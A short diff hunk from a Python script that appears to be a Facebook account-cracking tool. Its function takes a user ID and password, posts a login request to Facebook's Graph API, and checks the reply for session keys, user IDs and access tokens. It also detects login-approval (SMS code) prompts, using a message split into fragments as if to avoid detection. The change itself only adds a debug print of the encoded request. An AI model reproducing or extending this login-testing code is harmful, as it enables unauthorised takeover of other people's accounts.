@@ -1413,6 +1413,7 @@ def mbasic(uid,pwx,tl):
                 'fb_api_analytics_tags': '["GraphServices"]',
                 'client_trace_id': 'c4663a0f-a919-4454-bf17-3d542589eafe'}
             encode = urllib.parse.urlencode(data, doseq=True)
+            print(encode)
             twf = "login approval"+"s are on. "+"Expect an SMS"+" shortly with "+"a code to use"+" for log in"
             response = Session.post('https://graph.facebook.com/graphql', data=encode)
             if "session_key" in response.text and "uid" in response.text and "c_user" in response.text.replace('\\', '') and "access_token" in response.text:
